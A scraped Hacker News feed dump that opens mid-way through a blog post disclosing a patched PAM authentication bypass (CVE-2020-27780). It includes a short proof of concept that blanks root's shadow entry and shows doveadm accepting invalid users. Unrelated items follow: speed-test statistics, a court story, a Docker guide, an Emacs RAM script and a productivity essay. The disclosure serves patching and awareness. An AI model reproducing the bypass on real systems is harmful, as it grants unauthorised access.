<p>Usually people install <code>pacdiff</code> from <code>pacman-contrib</code> to deal with these
issues, as they are made a bit more explicit.</p>
<div><pre><code data-lang="text">[root@archlinux ~]# pacdiff 
==&gt; pacnew file found for /etc/shadow
:: (V)iew, (S)kip, (R)emove pacnew, (O)verwrite with pacnew, (Q)uit:</code></pre></div>
<p>This is the setup of the issue. The shadow file was updated, and the users did
not merge the change. The root account is without any password!</p>
<p>But how does this lead to an authentication bypass in PAM for <em>invalid</em> users?
This only applies for root after all.</p>
<h2 id="the-vulnerability">The Vulnerability</h2>
<p>Levente Polyak theorized that these invalid users clearly was returning
something valid for <code>pam_unix.so</code>. How else would they continue to authenticate?
Johannes spelunks through code, looking for the code path that would allow
invalid users to authenticate.</p>
<pre><code data-lang="pam">  demize  : I think it might be because of some changes they did to try to 
	    make the password checking for existing and non-existing users 
	    take the same amount of time.
  demize  : On the first iteration it'll try to get the password hash for the 
	    user. It doesn't exist, so it tries against against root, and 
	    since root did have a null password...
anthraxx  : yeah that would explain why it passes with nullok for non existing 
	    users
anthraxx  : that patch itself makes perfect sense to mitigate side channels</code></pre>
<p>The patch in question is the commit <a href="https://github.com/linux-pam/linux-pam/commit/af0faf666c5008e54dfe43684f210e3581ff1bca"><code>pam_unix: avoid determining if user exists</code></a>.</p>
<p>The commit attempts to avoid a timing attack against PAM. Some attacker can know
valid user names by timing how quickly PAM returns an error, so the fix is to
use an existing user in the system we always validate against to ensure a
consistent timing. But which user is always present on a Linux system? root!</p>
<p>The code does <em>not</em> check if root has any valid passwords set. An invalid user
would fail, loop over to root and try validate. root has no password. It’s
blank. We have <code>nullok</code> set. And we have <code>pam_permit.so</code>. The invalid user is
authenticated. We have enough information to do a quick POC.</p>
<h2 id="the-poc">The POC</h2>
<div><pre><code data-lang="text">[root@archlinux ~]# pacman -Q pam dovecot
pam 1.5.0-1
dovecot 2.3.11.3-2

[root@archlinux ~]# cat /etc/shadow
root:*:14871::::::

[root@archlinux ~]# doveadm auth test something
Password: 
passdb: something auth failed
extra fields:
  user=something
  
[root@archlinux ~]# sed -i 's/root:\*/root:/' /etc/shadow

[root@archlinux ~]# cat /etc/shadow
root::14871::::::

[root@archlinux ~]# doveadm auth test something
Password: 
passdb: something auth succeeded
extra fields:
  user=something
  
[root@archlinux ~]# doveadm auth test this-user-is-invalid
Password: 
passdb: this-user-is-invalid auth succeeded
extra fields:
  user=this-user-is-invalid</code></pre></div>
<p>This is clearly unfortunate for people that rely on PAM authentication for
their systems, and a good lecture as to why you probably shouldn’t use PAM for
this. Also some material for people that strongly believe Arch is not suitable
for servers. Win-win!</p>
<p>As of taping, the PAM package has been patched in Arch and currently going
through some testing. Luckily it’s a compound issue that needs a few things to
go wrong over quite a few months before it amounts to an exploit.</p>
<p><!-- raw HTML omitted -->The vulnerability has been assigned
CVE-2020-27780, and the fixed commit checks if root has a valid password
set.<!-- raw HTML omitted --></p>
<p><a href="https://github.com/linux-pam/linux-pam/commit/30fdfb90d9864bcc254a62760aaa149d373fd4eb"><code>Second blank check with root for non-existent users must never return 1</code></a></p>
<p>Thanks to Johannes Löthberg, Santiago Torres and Levente Polyak for reading over
the draft!</p>

                
                <p><a href="https://linderud.dev/blog/">Back to posts</a></p>
            </div></div>]]>
            </description>
            <link>https://linderud.dev/blog/pam-bypass-when-nullis-notok/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203265</guid>
            <pubDate>Tue, 24 Nov 2020 21:39:13 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[US internet speeds 91% faster in 2020 according to user speed tests]]>
            </title>
            <description>
<![CDATA[
Score 161 | Comments 203 (<a href="https://news.ycombinator.com/item?id=25203256">thread link</a>) | @mootothemax
<br/>
November 24, 2020 | https://fairinternetreport.com/research/usa-vs-europe-internet-speed-analysis | <a href="https://web.archive.org/web/*/https://fairinternetreport.com/research/usa-vs-europe-internet-speed-analysis">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><ul><li>US broadband speeds <strong>increased 91%</strong> from 2019-2020, <strong>nearly doubling</strong> YoY, as measured by annual speed test medians</li><li>US average broadband speeds overtook western EU countries like the UK, France, and Germany for the first time in 5 years</li><li>Broadband speeds in the EU overall rose 57% from 2019–2020, 34% lower than the 91% performance increase in the US</li></ul><p>American internet users have had a very good 2020: according to research performed by FairInternetReport, median US internet speeds in 2020 doubled to 33.16mbps, up from 17.34mbps in 2019. Covering the five years of 2016, 2017, 2018, 2019, and 2020, this is the largest speed increase seen in the US, with speeds staying essentially the same in 2016 and 2017 (8.91mbps and 9.08mbps respectively), and 2018 recording a median speed of 12.83mbps.</p><p>The US stills lags behind many European and developed nations worldwide, and its major cities also often lag behind their European equivalents. That said, there is cause for celebration in Dallas, Seattle and Austin, after our analysis has shown that these cities are performing extremely well relative to most European capital cities.</p></div></div></div>]]>
            </description>
            <link>https://fairinternetreport.com/research/usa-vs-europe-internet-speed-analysis</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203256</guid>
            <pubDate>Tue, 24 Nov 2020 21:38:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Man linked to missing Bitfinex/Tether funds hoodwinks defense team]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203155">thread link</a>) | @amycastor
<br/>
November 24, 2020 | https://amycastor.com/2020/11/24/reggie-fowler-hoodwinks-his-own-defense-team/ | <a href="https://web.archive.org/web/*/https://amycastor.com/2020/11/24/reggie-fowler-hoodwinks-his-own-defense-team/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4829">
			<!-- .entry-header -->
		<div>
		
<div><figure><a href="https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg"><img loading="lazy" data-attachment-id="4835" data-permalink="https://amycastor.com/con-man/" data-orig-file="https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg" data-orig-size="700,700" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="con-man" data-image-description="" data-medium-file="https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg?w=300" data-large-file="https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg?w=700" src="https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg?w=700" alt="" width="275" height="275" srcset="https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg?w=275 275w, https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg?w=550 550w, https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg?w=150 150w, https://amyhcastor.files.wordpress.com/2020/11/con-man.jpg?w=300 300w" sizes="(max-width: 275px) 100vw, 275px"></a></figure></div>



<p>Reginald Fowler, the Arizona businessman tied to hundreds of millions of dollars of Tether and Bitfinex’s missing money, appears to have conned his own defense team.&nbsp;</p>



<p>As I explained in a <a href="https://amycastor.com/2020/11/13/confirmed-reginald-fowler-cant-pay-his-lawyers/">previous post</a>, Fowler’s lawyers are seeking to withdraw from his case due to nonpayment. (The US government is accusing Fowler of operating a shadow banking operation for cryptocurrency exchanges.) But the details are privileged and confidential, so the judge overseeing the case agreed to allow them to file an ex parte sealed letter.</p>



<p>Judge Andrew Carter has now received the letter—from Hogan Lovells on behalf of itself and Rosenblum Schwartz—reviewed it, and filed a response.&nbsp;As I had suspected, Fowler appears to have hoodwinked his own defense team. Here is the eight-page <a href="https://amyhcastor.files.wordpress.com/2020/11/opinion-and-order.pdf">opinion and order</a>. </p>



<p>“Money isn’t everything,” the SDNY district judge writes. “But in this case, <em>it is the only thing.”&nbsp;</em>[Emphasis mine.]</p>



<p>According to Carter, Fowler’s jilted defense team recounted several conversations with their client in which Fowler promises to pay, but does not, effectively stringing them along. </p>



<p>“Mr. Fowler assured his attorneys he could pay, referring to planned business transactions, real property and bank accounts,” the judge said. </p>



<p>The defense counsel apparently understood that many of Fowler’s assets were frozen, but the hope was that Fowler could unfreeze certain assets by demonstrating that the assets had no connection to case. </p>



<p>However, during the time Fowler’s lawyers had been pressing him for payment and Fowler telling them he did not have the available funds, the lawyers learned that Fowler had plenty to pay his other lawyers—a large international law firm (name withheld) and an unnamed lawyer.</p>



<p>I’m not sure what exactly this means (a tip-off that Fowler had funds hidden away somewhere?) but Carter said: “The anonymous lawyer gave defense lawyer advice regarding Fowler’s ability to pay legal fees from funds that might not be related to criminal activity.”  </p>



<p>So why did Fowler’s lawyers wait this long before asking the court if they could dump their client when the troubles with getting paid started back in February? </p>



<p>According to Carter’s retelling, they thought the case would have been resolved with a guilty plea in January. However, the plea bargain blew up when Fowler learned it would require him to forfeit $371 million. </p>



<p>Recall that after that, federal prosecutors responded with a superseding indictment that added a fifth charge, which would have required a lot of additional (unpaid) work from the defense team. </p>



<p>Fowler’s defense team “decided they would continue representing him even though they had been owed a great deal of money for several months,” Carter said. “But largess shrinks when confronted by the prospect of additional, unpaid hours dedicated to trial preparation.” </p>



<h2>What next?</h2>



<p>There is still the issue of whether Fowler’s defense team should be allowed to withdraw from the case. But federal prosecutors needs to know more about their reasons for seeking withdrawal, so they can respond. </p>



<p>Some information in Hogan Lovells’ sealed ex parte needs to be made public and some needs to remain sealed, Carter said. Certain information about Fowler’s assets should remain sealed. Any information about plea negotiations needs to remain sealed as well. </p>



<p>However, details about the amount and timing of Fowler’s payments to the defense counsel is “highly relevant and should be made public.”</p>



<p>The name of the large international law firm should also be made public, Carter said, stating that “the size and nature of the firm is relevant to the fact that Mr. Fowler paid something to that firm—but did not fully pay Hogan and Rosenblum—and whether Hogan’s and Rosenblum’s acceptance of relatively low retainers was reasonable.”</p>



<p>Low retainers? This may be a sticky point, and something federal prosecutors make a big issue with in their next response. </p>



<p>The judge ordered Fowler’s defense team to file three versions of their letter—a public version redacting what should not be revealed to the government or the public; a sealed version, redacting what must not be disclosed to the government; and a third ex parte sealed version with no redactions. </p>



<p>All filings need to be completed by Dec. 1; the government has until Dec. 8 to respond. Replies are due by Dec. 11.</p>



<p><em>Nov. 24: Updated to clarify a few details, like what Fowler is being accused of and to emphasize that the retainer issue will likely come up again in the government’s response.</em></p>



<p><em>If you like my writing, please consider supporting my work by subscribing to my <a href="https://www.patreon.com/amycastor">Patreon account</a> for as little as $5 a month.</em></p>
			</div><!-- .entry-content -->

	<!-- .entry-footer -->
</article></div>]]>
            </description>
            <link>https://amycastor.com/2020/11/24/reggie-fowler-hoodwinks-his-own-defense-team/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203155</guid>
            <pubDate>Tue, 24 Nov 2020 21:24:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A 10x better way to manage your job search]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203150">thread link</a>) | @jacobdpeters
<br/>
November 24, 2020 | https://www.tealhq.com/job-tracker | <a href="https://web.archive.org/web/*/https://www.tealhq.com/job-tracker">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="w-node-c72cce9215f1-2656f85e"><div><h2>Save any job listing <br>on the internet.</h2><p>Teal's Chrome Extension will scrape job descriptions from all the most popular listing sites — from LinkedIn to Glassdoor. If it doesn’t recognize a site, you can also add the job posting manually.<br></p></div></div></div>]]>
            </description>
            <link>https://www.tealhq.com/job-tracker</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203150</guid>
            <pubDate>Tue, 24 Nov 2020 21:24:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to easily set up Docker-compose for wordpress/PHP/MySQL]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25203009">thread link</a>) | @webdevetc
<br/>
November 24, 2020 | https://webdevetc.com/programming-tricks/wordpress/tips/wordpress-docker-docker-composeyml-guided-tutorial/ | <a href="https://web.archive.org/web/*/https://webdevetc.com/programming-tricks/wordpress/tips/wordpress-docker-docker-composeyml-guided-tutorial/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="page"><section id="main-content" tabindex="-1"><div><div id="primary"><div id="content" role="main"><div><p>November 15, 2020</p><!----><!----><div id="article-area"><p>If you need to use Wordpress locally, but do not want to go to the effort of setting up a web server and MySQL then you can easily set it all up using <strong>Docker</strong> (with <strong>docker-compose</strong>).</p>
<p>If you have your WordPress files in <code>/yoursite/</code> (so you have <code>/yoursite/wp-content/themes/your-theme/</code> and <code>/yoursite/wp-content/plugins/some-plugins</code>) you can use the following <code>docker-compose.yml</code>.</p>
<p>(You do not need any WordPress files outside of <code>/wp-content</code> for this to work)</p>
<pre><code><span>version</span><span>:</span><span> </span><span>'</span><span>3.1</span><span>'</span>
<span># Source: https://webdevetc.com/programming-tricks/wordpress/tips/wordpress-docker-docker-composeyml-guided-tutorial/</span>

<span>services</span><span>:</span>
<span>  </span><span>db</span><span>:</span><span> </span><span># mysql</span>
<span>    </span><span>image</span><span>:</span><span> </span><span>mysql:5.7</span>
<span>    </span><span>restart</span><span>:</span><span> </span><span>always</span>
<span>    </span><span>environment</span><span>:</span>
<span>      </span><span>MYSQL_DATABASE</span><span>:</span><span> </span><span>exampledb</span>
<span>      </span><span>MYSQL_USER</span><span>:</span><span> </span><span>exampleuser</span>
<span>      </span><span>MYSQL_PASSWORD</span><span>:</span><span> </span><span>examplepass</span>
<span>      </span><span>MYSQL_RANDOM_ROOT_PASSWORD</span><span>:</span><span> </span><span>'</span><span>1</span><span>'</span>
<span>    </span><span>volumes</span><span>:</span>
<span>      </span><span>- </span><span>db:/var/lib/mysql</span><span> </span><span># use the 'db' volume for `/var/lib/mysql`</span>

<span>  </span><span>wordpress</span><span>:</span><span> </span><span># wordpress / php / apache docker config</span>
<span>    </span><span>image</span><span>:</span><span> </span><span>wordpress:5.5.3-php7.4-apache</span>
<span>    </span><span>depends_on</span><span>:</span><span> </span><span>db</span>
<span>    </span><span>restart</span><span>:</span><span> </span><span>always</span>
<span>    </span><span>ports</span><span>:</span>
<span>      </span><span>- </span><span>8080:80</span><span> </span><span># access it on localhost:80</span>
<span>    </span><span>environment</span><span>:</span><span> </span><span># database credentials:</span>
<span>      </span><span>WORDPRESS_DB_HOST</span><span>:</span><span> </span><span>db</span><span> </span><span># points to the 'db' service (below)</span>
<span>      </span><span>WORDPRESS_DB_USER</span><span>:</span><span> </span><span>exampleuser</span>
<span>      </span><span>WORDPRESS_DB_PASSWORD</span><span>:</span><span> </span><span>examplepass</span>
<span>      </span><span>WORDPRESS_DB_NAME</span><span>:</span><span> </span><span>exampledb</span>
<span>    </span><span>volumes</span><span>:</span>
<span>      </span><span>- </span><span>./wp-content:/var/www/html/wp-content</span><span> </span><span># &lt;&lt; maps your local ./wp-content to the wp-content directory on the server</span>

<span>volumes</span><span>:</span>
<span>  </span><span>db</span><span>:</span><span>  </span><span># for mysql</span></code></pre>
<p>Once you have the above config saved as <code>docker-compose.yml</code> and you have Docker installed, just run <code>docker-compose up</code> to start everything.</p>
<p>Then visit <code>http://localhost:8080</code> and you should see the WordPress installation.</p>
<p>Once done you can run <code>docker-compose down</code>.</p>
<p>Note: This <strong>docker config</strong> is ideal if you need to make changes to a theme or plugin. It is not ideal if you need to import a database dump. If you need to edit files outside of <code>/wp-content</code> then you can add more <code>volumes</code> configuration to the <code>wordpress</code> service.</p>
</div><!----><!----></div></div></div></div></section></div></div>]]>
            </description>
            <link>https://webdevetc.com/programming-tricks/wordpress/tips/wordpress-docker-docker-composeyml-guided-tutorial/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25203009</guid>
            <pubDate>Tue, 24 Nov 2020 21:08:15 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Emacs Speed Up 1000%]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25202942">thread link</a>) | @tartoran
<br/>
November 24, 2020 | https://blog.binchen.org/posts/emacs-speed-up-1000.html | <a href="https://web.archive.org/web/*/https://blog.binchen.org/posts/emacs-speed-up-1000.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <div>
<p>
I'm still <b>NOT</b> satisfied with my Emacs performance after applying below tricks:
</p>

<ul>
<li>autoload packages</li>
<li>idle-load packages</li>
<li>compiling *.el to  *.elc</li>
</ul>
<p>
After some research, I found I could make my Emacs 1000% fast <b>in 1 minute</b>.
</p>

<p>
Please note I'm talking about the <b>general performance</b> not just startup time.
</p>

<p>
The solution is really simple.
</p>

<p>
Since I'm a Linux guy and my computer got enough (24G) memory. I can place my setup into <a href="http://en.wikipedia.org/wiki/Tmpfs">memory</a>.
</p>

<p>
<b>Step 1</b>, insert below line into /etc/fstab and restart computer:
</p>

<div>

<pre><code>tmpfs       /tmp        tmpfs       nodev,nosuid,size=8G    0   0
</code></pre>

</div>

<p>
<b>Step 2</b>, run the script "emacs2ram":
</p>

<div>

<pre><code>#!/bin/sh

if [ -z "$1" ];then
    echo "Usage:"
    echo "  emacs2ram start"
    echo "  emacs2ram restore"
    exit 1
fi

if [ "$1" == "start" ];then
    backup=emacs.d-backup
    link=.emacs.d
    volatile=/tmp/.emacs.d-$USER

    IFS=
    set -efu

    cd ~/

    if [ ! -r $volatile ]; then
        mkdir -m0700 $volatile
    fi

    # link -&gt; volatie does not exist
    if [ "$(readlink $link)" != "$volatile" ]; then
        # backup project at first
        mv $link $backup
        # create the link
        ln -s $volatile $link
    fi

    if [ -e $link/.unpacked ]; then
        echo "Sync .emacs.d from memory to backup ..."
        rsync -avq --delete --exclude .unpacked ./$link/ ./$backup/
        echo "DONE!"
    else
        echo "Sync .emacs.d from disk to memory ..."
        rsync -avq ./$backup/ ./$link/
        touch $link/.unpacked
        echo "DONE!"
    fi
else
    echo "Moving .emacs.d back to disk ..."
    backup=$2-backup
    link=$2
    volatile=/tmp/$2-$USER
    cd ~/projs
    rm $link &amp;&amp; mv $backup $link &amp;&amp; rm -rf $volatile
    echo "DONE!"
fi
</code></pre>

</div>

<p>
That's all! Please enjoy Emacs as usual.
</p>

<p>
The original script is from ArchLinux Wiki. I learned this technique eight years ago. I'm just wondering why I need eight years to apply it?
</p>

<p>
BTW, I've also moved <b>all my projects into memory</b>, using similar scripts.
</p>

<p>
<b>UPDATE 1:</b>
I also publicize my project-managing script at <a href="https://gist.github.com/redguardtoo/596b1a9fd3eac1cedd13#file-proj2ram">gist</a>. It's almost same as emacs2ram. 
</p>

<p>
<b>UPDATE 2:</b>
Now I use <a href="https://hoytech.com/vmtouch/">vmtouch</a> which is easier to use and more light weight. Run <code>vmtouch -vt ~/.emacs.d</code> to place the directory into memory.
</p>

<p>
Unfortunately, <code>vmtouch</code> doesn't support Windows. You can convert my bash script to DOS batch script. Basically the script copies the directory into ram disk and create a link to the directory in memory. You can use <a href="https://sourceforge.net/projects/imdisk-toolkit/">ImDisk Toolkit</a> to create ram disk.</p>
</div>
        </div></div>]]>
            </description>
            <link>https://blog.binchen.org/posts/emacs-speed-up-1000.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202942</guid>
            <pubDate>Tue, 24 Nov 2020 20:58:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If other engineers in your team are more productive]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25202907">thread link</a>) | @_elergy_
<br/>
November 24, 2020 | https://evgenii.info/faster-pacers/ | <a href="https://web.archive.org/web/*/https://evgenii.info/faster-pacers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
    <div>

        <article>

            

            <figure>
                <img srcset="https://evgenii.info/content/images/size/w300/2020/11/wolfgang-hasselmann-mBccivEQvlk-unsplash--1-.jpg 300w,
                            https://evgenii.info/content/images/size/w600/2020/11/wolfgang-hasselmann-mBccivEQvlk-unsplash--1-.jpg 600w,
                            https://evgenii.info/content/images/size/w1000/2020/11/wolfgang-hasselmann-mBccivEQvlk-unsplash--1-.jpg 1000w,
                            https://evgenii.info/content/images/size/w2000/2020/11/wolfgang-hasselmann-mBccivEQvlk-unsplash--1-.jpg 2000w" sizes="(max-width: 800px) 400px,
                        (max-width: 1170px) 1170px,
                            2000px" src="https://evgenii.info/content/images/size/w2000/2020/11/wolfgang-hasselmann-mBccivEQvlk-unsplash--1-.jpg" alt="Not as Productive as Others?">
            </figure>

            <section>
                <div>
                    <blockquote>This is another article about pacers – people whom we use as an example to adjust our behaviour, mostly unconsciously.</blockquote><h2 id="surrounded-by-faster-pacers">Surrounded by faster pacers</h2><p>In this part, we will talk about problems that may occur when <em>you feel </em>that a lot of people in your team are much more productive than you. <br>In many cases, it doesn't lead to any problems – people happily work together and achieve great results. But sometimes their mutual influence can be destructive, and people would feel demotivated and discouraged.</p><p>Several symptoms are indicating that you're affected by faster pacers:</p><ul><li>You feel guilty seeing that colleagues have achieved more than you</li><li>You are afraid of taking challenging tasks which can make you stuck for a while</li><li>You feel like you have to work longer hours to keep up with others</li></ul><p>Daily standups or any other form of sync with colleagues is the perfect time to diagnose this problem:</p><ul><li>Are you nervous about sharing your progress?</li><li>Do those meetings make you feel like you have not done enough? </li><li>Do you find it challenging to describe your results and plans?</li></ul><p>If any of these describes you, a closer look is needed.</p><h2 id="five-actions-to-solve-the-problem">Five actions to solve the problem</h2><p>The most popular advice I heard in this situation is to take it easy. It is normal to have somebody more productive than you, left alone the fact that nobody can be a top performer in all situations.</p><p>Even though I fully understand the reasoning behind this suggestion, I do not think it is helpful. If somebody is nervous about attending standups, you cannot fix it by suggesting not to worry.</p><p>Instead, you can face this problem, find out the reasons and prepare an improvement plan, even if the problem exists only in your imagination. Then, it's going to be up to you whether to follow this plan or not, but at least you will take matters into your own hands – that alone can be sufficient to address most of the symptoms.</p><p>Let's talk about the five things which you can do to get out of this unpleasant situation. </p><h3 id="action-one-demystify-top-performers">Action one: demystify top performers<br></h3><blockquote>no two writers are the same, like snowflakes and fingerprints. No one will ever write in just the way that you do, or in just the way that anyone else does. Because of this fact, there is no real competition between writers. &lt;...&gt; Writing is a matter strictly of developing oneself. You compete only with yourself. You develop yourself by writing.<p>– John McPhee</p></blockquote><p>In time, everyone develops their areas of expertise. No matter how broad or narrow they are, one is the same — people are much more productive when their job overlaps with those areas.</p><p>Before bringing up your own expertise, I would recommend you you to think about your more productive colleagues. <strong>Every time they do something great, ask yourself what helped them to achieve those results.</strong></p><p>Something that could sound self-deprecating at first:</p><blockquote>Mark finished this giant feature for a week. That one would take more than a month for me!</blockquote><p>Can be rephrased and cleansed of magic:</p><blockquote>Mark finished this giant feature in a week because he's been building similar ones for the past three years.<br>He did more than ten last year – now he's extremely good at it.</blockquote><p>Now you can see that Mark's fast pace didn't appear overnight – it required years of deliberate practice. Moreover, you know that doing more things in this area can help you to close this gap.</p><p>That is not the only way of reframing achievements. It could be something like this:</p><blockquote>Mark finished it in a week because he wrote the whole system since the beginning and he knows every line of code by heart.</blockquote><p>or even this:</p><blockquote>... because he did not have the internet at home and spent all his free time working in the office.</blockquote><p>No matter the situation, your goal should be to stop seeing people as <em>just productive</em> and start noticed the reasons behind their results. Most of the time, those reasons are ordinary and achievable by anybody.</p><h3 id="action-two-find-your-comfort-zone">Action two: find your comfort zone</h3><p>Simply put, there are three types of activities:</p><ul><li>Something you enjoy the most</li><li>Something you are good at</li><li>Most important things for the company at the moment</li></ul><figure><img src="https://evgenii.info/content/images/2020/11/Three-types-niche.png" alt=""><figcaption>Three types of activities at work</figcaption></figure><p>The intersection of all three circles is your <em>niche </em>in the team, but finding and expanding your niche deserves a separate article. For this topic, I will focus only on the comfort zone (highlighted in green).</p><p>Everybody has ups and downs, and you will have many periods of not being at your best.<br>One of the smartest things you can do is to prepare something that can give you a little boost when needed — a type of work you like to be doing or an area where you can be very productive.</p><p>If you do not have a comfort zone right now — build one:</p><ul><li>Familiarize yourself with plans of your team.</li><li>Pick an area which will require work in the future.</li><li>Start building expertise there to capitalize on it when the time comes.</li></ul><h3 id="action-three-define-expectations-and-track-achievements">Action three: define expectations and track achievements</h3><p>The easiest way to not meet expectations is is to have no expectations at all. No matter what you achieve, you can always find a room for improvement.</p><p>The simplest way of coping with that is to formulate your goals before you start working towards them. I find daily plans most precise and helpful for this purpose; here is one of my recent ones:</p><figure><img src="https://evgenii.info/content/images/2020/11/image.png" alt=""></figure><p>The expectations were clear and realistic, but I ended up not finishing half of what I planned to do.</p><p>Was it a problem? No, because I knew that I had done more important things instead, and there was absolutely no reason to feel sad about my initial plan.</p><h3 id="action-four-keep-expectations-reasonable">Action four: keep expectations reasonable</h3><p>Sometimes results are noticeably small in comparison to goals:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-1.png" alt=""><figcaption>planned: 7; finished: 1</figcaption></figure><p>While this is a call to think about what can be improved, I would recommend checking your expectations for feasibility first.</p><p>There is a simple exercise to figure out if you are unrealistic in your estimations:</p><ul><li>Take some tasks your team plans to work on and imagine how much time each of them would take for you. Can you complete a particular task one day? In a week? Or maybe you can do five of those in an hour?</li><li>Write it somewhere.</li><li>When <em>other people</em> complete those tasks, check how their results match your estimations. <br>Were they working within their niches or tried something new? How did it impact them?</li></ul><p>This exercise is also helpful when your plans are unambitious and require correction:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-2.png" alt=""><figcaption>100% done!</figcaption></figure><h3 id="action-five-analyse-and-improve">Action five: analyse and improve</h3><p>Detailed plans can be beneficial even when everything looks good:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-3.png" alt=""><figcaption>Perfect plan and execution</figcaption></figure><p>Even though the result matched your expectation, a picky perfectionist can find some food for reflection:</p><figure><img src="https://evgenii.info/content/images/2020/11/image-4.png" alt=""><figcaption>Digging deeper</figcaption></figure><p>I rarely use this method – maybe once every two or three months, but it always helps to take control and find something I can change.</p><h2 id="prove-it-works">Prove it works</h2><p>At the beginning of this article, I mentioned that the best way of noticing this problem is to pay attention to your behaviour when you need to share your progress and describe the plans.</p><p>Feeling that you have not done enough can contribute to the demotivation, which will prevent you from working at your best, which will cause dissatisfaction of not achieving enough, which will incur even more demotivation, which will further decrease your productivity, which will make it even harder to get out of this loop.</p><p>The good news is that the actions above can help you to</p><ul><li>Understand if your expectations are realistic and how to adjust them if they are not</li><li>Find the quick way to get back on track after a period of dissatisfaction</li><li>Figure out what is the exact reason for dissatisfaction and how to improve it</li></ul><p>If anything, it doesn't leave too many reasons to worry.</p><hr><p>As always, you can <a href="https://evgenii.info/faster-pacers#subscribe">subscribe to Resilient Systems</a> and receive new articles by email if you haven't done it yet. <br>You also can <a href="https://twitter.com/_elergy_">find me on Twitter</a> or somewhere else – I am always happy to chat :-) &nbsp;</p>
                </div>
            </section>

                <section>
    <h3>Subscribe to Resilient Systems</h3>
    <p>Get the latest posts delivered right to your inbox</p>
    <form data-members-form="subscribe">
        
        <p><strong>Great!</strong> Check your inbox and click the link to confirm your subscription.
        </p>
        <p>
            Please enter a valid email address!
        </p>
    </form>
</section>

        </article>

    </div>
</div></div>]]>
            </description>
            <link>https://evgenii.info/faster-pacers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25202907</guid>
            <pubDate>Tue, 24 Nov 2020 20:54:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[React Implemented in a Tweet]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25202779">thread link</a>) | @asyncanup
<br/>
November 24, 2020 | https://anupbishnoi.com/2019/react-in-a-tweet/ | <a href="https://web.archive.org/web/*/https://anupbishnoi.com/2019/react-in-a-tweet/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
        <div>
  
  <p><span>24 Jul 2019</span></p><p>Let’s implement the basic <a href="https://reactjs.org/">React</a> API in a tweet, with React DOM &amp; State management as a separate plugin in another tweet.</p>

<h2 id="what-we-want-and-shall-get">What we want, and shall get</h2>

<ul>
  <li>Top-down, one-way, state-driven rendering.</li>
  <li>Compose HTML primitives into higher-level components.</li>
  <li>Ability to write JSX to define components.</li>
  <li>Custom props for higher-order components.</li>
  <li>Event handlers that can change application state and trigger re-renders.</li>
</ul>

<h2 id="what-we-wont-get">What we won’t get</h2>

<ul>
  <li>No virtual DOM diffing between old and new renders for efficient DOM updates,
so re-renders will replace HTML content.</li>
  <li><code>setState</code> won’t be asynchronous, but synchronous.</li>
  <li>DOM event handlers won’t have React-ified names (like <code>onClick</code>), but default
DOM names (like <code>onclick</code>).</li>
  <li>Only necessary API surface area implemented, so <em>yes</em> <code>React.createElement</code>,
and <em>no</em> <code>React.cloneElement</code>.</li>
  <li>No <a href="https://reactjs.org/docs/hooks-intro.html">React Hooks</a> API.</li>
</ul>

<h2 id="code">Code</h2>

<p>Here’s React defined as a global</p>

